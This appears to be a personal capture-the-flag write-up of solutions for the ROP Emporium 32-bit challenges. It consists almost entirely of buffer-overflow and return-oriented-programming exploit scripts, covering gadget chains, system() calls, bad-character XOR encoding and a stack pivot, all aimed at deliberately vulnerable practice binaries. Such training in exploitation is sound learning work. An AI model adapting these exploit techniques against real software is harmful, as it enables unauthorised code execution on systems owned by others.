
### target

    https://ropemporium.com/ (32bit binaries)

### ret2win

```
$ /opt/metasploit/tools/exploit/pattern_create.rb -l 200 > /tmp/input
$ gdb ret2win32
(gdb) run < /tmp/input
$ /opt/metasploit/tools/exploit/pattern_offset.rb -q 0x35624134

# identify address of function to jump to (ret2win):
$ objdump -M intel -j .text -d ret2win32 | gvim -

# PoC:
(gdb) run <<< `python2 -c 'print "A"*44 + "B"*4'`

# Exploitation:
$ python2 -c 'print "A"*44 + "\x59\x86\x04\x08"' | ./ret2win32
```

### split

```
# idenitfy address of system()
objdump -d split32 | grep system

# idenitfy address of '/bin/cat flag.txt' string
objdump -j .data -s split32

# stack layout needed:

# normal stack      ret2sys stack
| buffer |          | buffer         |
| EBP    |          | EBP            |
| RET    |          | RET==system()  |
| ARGS   |          | 4-byte PAD     |
                    | ARG to system()|

PAD - constitutes for ret address from system() could be used to chain additional function call after system() if needed

# exploitation
python2 -c 'print "A"*44 + "\x30\x84\x04\x08" + "MZET" + "\x30\xa0\x04\x08"' | ./split32
```

### callme

```
# gadget of choice for clearing 3 args from the stack:
$ ropper --file callme32
0x08048576: add esp, 8; pop ebx; ret;

# onliner solution:
$ python2 -c 'print "A"*44 + "\xc0\x85\x04\x08" + "\x76\x85\x04\x08" + "\x01\x00\x00\x00" + "\x02\x00\x00\x00" + "\x03\x00\x00\x00" + "\x20\x86\x04\x08" + "\x76\x85\x04\x08" + "\x01\x00\x00\x00" + "\x02\x00\x00\x00" + "\x03\x00\x00\x00" + "\xb0\x85\x04\x08" + "\xe0\x85\x04\x08" + "\x01\x00\x00\x00" + "\x02\x00\x00\x00" + "\x03\x00\x00\x00"' | ./callme32

# python solution:
cat > callme32-exploit.py << EOF
#! /usr/bin/env python2

import struct
import os

callme1_addr = struct.pack('<L', 0x080485c0)
callme2_addr = struct.pack('<L', 0x08048620)
callme3_addr = struct.pack('<L', 0x080485b0)
callme123_args = struct.pack('< I I I', 1, 2, 3)
exit_addr = struct.pack('<L', 0x080485e0)
# add esp,8; pop ebx; ret
gadget_addr = struct.pack('<L', 0x08048576)

payload = "A" * 44 + callme1_addr + gadget_addr + callme123_args + callme2_addr + gadget_addr + callme123_args + callme3_addr + exit_addr + callme123_args

callme = os.popen('./callme32', 'w')
callme.write(payload)
EOF
```

### write4

```
cat > write432-exploit.py << EOF
#! /usr/bin/env python2

import struct
import os

# address to write string to (beginning of .data section)
dest_addr = 0x0804a028

def callSystem(cmd_addr):

    # system() address
    ret2sys = struct.pack('<L', 0x08048430)
    # func ret address
    ret2sys += struct.pack('>L', 0x4d5a4554)
    # param to system()
    ret2sys += struct.pack('<L', cmd_addr)

    return ret2sys

def write4(toAddr, value):

    rop = ""

    # pop edi; pop ebp; ret;
    rop += struct.pack('<L', 0x080486da)

    # 'dest' address (goes to edi)
    rop += struct.pack('<L', toAddr)

    # data to be written to 'dest' (goes to ebp)
    rop += struct.pack('<L', value)

    # nop; nop; mov dword ptr [edi], ebp; ret;
    rop += struct.pack('<L', 0x0804866e)

    return rop

def writeString(toAddr, string):

    rop=""

    # use 'write4' primitive
    primUsed = 4

    # calculate number of iterations needed
    iterations = len(string) / primUsed

    # write 'primUsed' long part of the 'string' at a time starting at 'toAddr' location
    for i in xrange(0, iterations):
        chunk = string[i*primUsed:i*primUsed + primUsed]
        strAsInt = struct.unpack('<L', chunk)[0]
        rop += write4(toAddr + i*primUsed, strAsInt)

    return rop

# returns rop for writing arbitrary long string at given location. Currently string needs to be divisible by 4 (pad with \0s if necessary)
rop = writeString(dest_addr, "/bin/cat flag.txt\0\0\0")

# call system()
ret2sys = callSystem(dest_addr)

payload = "A" * 44 + rop + ret2sys

# write payload directly to process's stdin:
callme = os.popen('./write432', 'w')
callme.write(payload)

# write payload to a file:
#f = open("write432_payload", "w")
#f.write(payload)
#f.close()
EOF

```

### badchars

```
cat > badchars32-exploit.py << EOF
#! /usr/bin/env python2

# do no use chars: b i c / <space> f n s
# $ ropper -b '626963666e7320' --file ./badchars32

import struct
import os

# address to write string to (beginning of .data section)
dest_addr = 0x0804a038

# badchars
badchars = "bic/ fns"

# cmd to execute
cmd = "cat flag.txt"
# for whatever reason this does not work for me:
#cmd = "/bin/cat flag.txt\0\0\0"

def callSystem(cmd_addr):

    # system() address
    ret2sys = struct.pack('<L', 0x080484e0)
    # func ret address
    # exit() 0x080484f0
    ret2sys += struct.pack('>L', 0x080484f0)
    # param to system()
    ret2sys += struct.pack('<L', cmd_addr)

    return ret2sys

def write4(toAddr, value):

    rop = ""

    # 0x08048899: pop esi; pop edi; ret;
    rop += struct.pack('<L', 0x08048899)

    # data to be written to 'dest' (goes to esi)
    rop += struct.pack('<L', value)

    # 'dest' address (goes to edi)
    rop += struct.pack('<L', toAddr)

    # 0x08048893: mov dword ptr [edi], esi; ret;
    rop += struct.pack('<L', 0x08048893)

    return rop

def writeString(toAddr, string):

    rop=""

    # use 'write4' primitive
    primUsed = 4

    # calculate number of iterations needed
    iterations = len(string) / primUsed

    # write 'primUsed' long part of the 'string' at a time starting at 'toAddr' location
    for i in xrange(0, iterations):
        chunk = string[i*primUsed:i*primUsed + primUsed]
        strAsInt = struct.unpack('<L', chunk)[0]
        rop += write4(toAddr + i*primUsed, strAsInt)

    return rop

def unmangleChar(c, addr):
    mask = 0xeb
    x = ord(c) ^ mask
    rop = ""

    # 0x08048896: pop ebx; pop ecx; ret;
    rop += struct.pack('<L', 0x08048896)

    # address of character to modify (goes to ebx)
    rop += struct.pack('<L', addr)

    # data to modify (x) character in the string (goes to ecx)
    rop += struct.pack('<L', x)

    # 0x08048890: xor byte ptr [ebx], cl; ret;
    rop += struct.pack('<L', 0x08048890)

    return rop

def postprocString(str_addr, string, badchars):
    i=0
    rop=""

    for c in string:
        if c in badchars: 
            print c
            rop += unmangleChar(c, str_addr + i)
        i+=1

    return rop

# returns rop for writing arbitrary long string at given location. Currently string needs to be divisible by 4 (pad with \0s if necessary)
#rop = writeString(dest_addr, "/bin/cat flag.txt\0\0\0")
rop1 = writeString(dest_addr, cmd)

# deals with a list of provided bad characters in a string
rop2 = postprocString(dest_addr, cmd, badchars)

# calls system() and exit()
ret2sys = callSystem(dest_addr)

payload = "A" * 44 + rop1 + rop2 + ret2sys

# write payload directly to process's stdin:
callme = os.popen('./badchars32', 'w')
callme.write(payload)

# write payload to a file:
#f = open("badchars32_payload", "w")
#f.write(payload)
#f.close()
EOF
```

### fluff

```
cat > fluff32-exploit.py << EOF
#! /usr/bin/env python2

import struct
import os

# address to write string to (beginning of .data section)
dest_addr = 0x0804a028

# cmd to execute
cmd = "/bin/cat flag.txt\0\0\0"

def callSystem(cmd_addr):

    # system() address
    ret2sys = struct.pack('<L', 0x08048430)
    # func ret address
    ret2sys += struct.pack('>L', 0x4d5a4554)
    # param to system()
    ret2sys += struct.pack('<L', cmd_addr)

    return ret2sys

def setECX(v):
    return "".join([
        # 0x08048671: xor edx, edx; pop esi; mov ebp, 0xcafebabe; ret;
        struct.pack('<L', 0x08048671),
        struct.pack('<L', 0xffffffff),
        # 0x080483e1: pop ebx; ret;
        struct.pack('<L', 0x080483e1),
        struct.pack('<L', v),
        # 0x0804867b: xor edx, ebx; pop ebp; mov edi, 0xdeadbabe; ret;
        struct.pack('<L', 0x0804867b),
        struct.pack('<L', 0xffffffff),
        # 0x08048689: xchg edx, ecx; pop ebp; mov edx, 0xdefaced0; ret;
        struct.pack('<L', 0x08048689),
        struct.pack('<L', 0xffffffff)
    ])

def setEDX(v):
    return "".join([
        # 0x08048671: xor edx, edx; pop esi; mov ebp, 0xcafebabe; ret;
        struct.pack('<L', 0x08048671),
        struct.pack('<L', 0xffffffff),
        # 0x080483e1: pop ebx; ret;
        struct.pack('<L', 0x080483e1),
        struct.pack('<L', v),
        # 0x0804867b: xor edx, ebx; pop ebp; mov edi, 0xdeadbabe; ret;
        struct.pack('<L', 0x0804867b),
        struct.pack('<L', 0xffffffff),
    ])

def write4(toAddr, value):
    return "".join([
        setECX(toAddr),
        setEDX(value),
        # write 'value' at 'toAddr':
        # 0x08048693: mov dword ptr [ecx], edx; pop ebp; pop ebx; xor byte ptr [ecx], bl; ret;
        struct.pack('<L', 0x08048693),
        struct.pack('<L', 0xffffffff),
        # lame: NUL bytes in payload but needed to compensate 'xor byte ptr [ecx], bl' from the gadget
        struct.pack('<L', 0x00000000)
    ])

def writeString(toAddr, string):

    rop=""

    # use 'write4' primitive
    primUsed = 4

    # calculate number of iterations needed
    iterations = len(string) / primUsed

    # write 'primUsed' long part of the 'string' one at a time starting at 'toAddr' location
    for i in xrange(0, iterations):
        chunk = string[i*primUsed:i*primUsed + primUsed]
        strAsInt = struct.unpack('<L', chunk)[0]
        rop += write4(toAddr + i*primUsed, strAsInt)

    return rop

# returns rop for writing arbitrary long string at given location. String needs to be divisible by 4 (pad with \0s if necessary)
rop = writeString(dest_addr, cmd)

# call system()
ret2sys = callSystem(dest_addr)

payload = "A" * 44 + rop + ret2sys

# write payload directly to process's stdin:
#fluff = os.popen('./fluff32', 'w')
#fluff.write(payload)

# write payload to a file:
f = open("fluff32_payload", "w")
f.write(payload)
f.close()
EOF
```

### pivot

Exploit:

```
cat > pivot32-exploit.py << EOF
#! /usr/bin/env python2

import os
import sys
import struct
import pexpect

# offset in bytes from foothold_function() to ret2win()
RET2WIN_OFFSET = 503

def usage():
    print "./pivot32-exploit.py <pipefile> <addr2pivot>"

def callFootholdFunc():
    return "".join([
        struct.pack("<L", 0x080485f0),
    ])

def callArbitraryFunc(offset):
    return "".join([
        ## set EAX to address of .got.plt entry of foothold_function
        # 0x080488c0: pop eax; ret;
        struct.pack("<L", 0x080488c0),
        struct.pack("<L", 0x080485f0 + 2),
        # 0x080488c4: mov eax, dword ptr [eax]; ret;
        struct.pack("<L", 0x080488c4),
        ## get address (from .got.plt) of foothold_function
        # 0x080488c4: mov eax, dword ptr [eax]; ret;
        struct.pack("<L", 0x080488c4),
        ## add offset from foothold_function to ret2win function
        # 0x08048571: pop ebx; ret;
        struct.pack("<L", 0x08048571),
        struct.pack("<L", offset),
        # 0x080488c7: add eax, ebx; ret;
        struct.pack("<L", 0x080488c7),
        ## call ret2win
        # 0x0804869e: push 0x804a03c; call eax;
        struct.pack("<L", 0x0804869e)
    ])

def stackPivot(toAddr):
    return "".join([
        # 0x080488c0: pop eax; ret;
        struct.pack("<L", 0x080488c0),
        struct.pack("<L", toAddr),
        # 0x080488c2: xchg eax, esp; ret;
        struct.pack("<L", 0x080488c2)
    ])

if len(sys.argv) != 3:
    usage()
    sys.exit(1)

pipefile = sys.argv[1]
pivotDest = int(sys.argv[2], 16)

# first chain (stage-0):
# [1] hijacks execution flow (by overwriting pwnme()'s ret address)
# [2] transfers execution flow to stage-1 chain
#pivotDest = input("place to pivot: ")
rop1 = "A"*44 + stackPivot(pivotDest) + "\n"

# second chain (stage-1): 
# [1] resolves GOT entry for foothold_function()
# [2] calls ret2win (taking advantage of precalculated offset between functions)
rop2 = callFootholdFunc() + callArbitraryFunc(RET2WIN_OFFSET) + "\n"

# write payload to the pipe used by the victim pivot32 process
f = open(pipefile, "w")
f.write(rop2 + rop1)
f.close()

"""
## attempt (unsuccessful) to fully automate exploit with Python's pexpect:
# for debugging:
# cli version for calling foothold_function()
# python2 -c 'from struct import pack; print pack("<L", 0x080485f0) + "C"*252 + "A"*43 + pack("<L", 0x080488c0) + pack("<L", 0xffffffff) + pack("<L", 0x080488c2)'
#rop2 = "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC"
#rop1 = "A"*44 + struct.pack("<L", 0x080488c0) + struct.pack("<L", 0xeeeeeeee)
#rop1 = "A"*44 + "B"*4 

p = pexpect.spawn('./pivot32')
res = p.expect(r'0x[0-9a-f]{8}')
pivotDest = int(p.after, 16)
rop1 = "A"*44 + stackPivot(pivotDest)
#print hex(pivotDest)
p.expect('>')
p.sendline(rop2)
p.expect('>')
p.sendline(rop1)
p.close()
"""
EOF
```

This time my exploit is not fully automated because we need an address to pivot to (due to ASLR it is randomized). Fortunately it is "leaked" for us in process's output.

Usage:

```
$ (tail -f fajka) | ./pivot32
pivot by ROP Emporium
32bits

Call ret2win() from libpivot.so
The Old Gods kindly bestow upon you a place to pivot: 0xf75bef08
Send your second chain now and it will land there
>

(on 2nd terminal)

$ ./pivot32-exploit.py fajka 0xf75bef08
```

